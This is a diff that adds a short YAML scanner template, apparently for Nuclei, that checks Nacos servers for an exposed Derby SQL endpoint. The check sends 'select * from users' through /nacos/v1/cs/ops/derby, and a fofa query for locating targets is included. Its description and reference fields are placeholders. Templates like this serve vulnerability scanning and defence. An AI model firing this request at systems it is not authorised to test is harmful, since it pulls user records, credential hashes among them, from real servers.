@@ -1,0 +1,27 @@
+id: nacos_sql
+info:
+  name: nacos_sql
+  author: mike
+  severity: info
+  description: xxx
+  reference: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="NACOS"
+http:
+  - raw:
+      - |
+        GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20 HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "data"
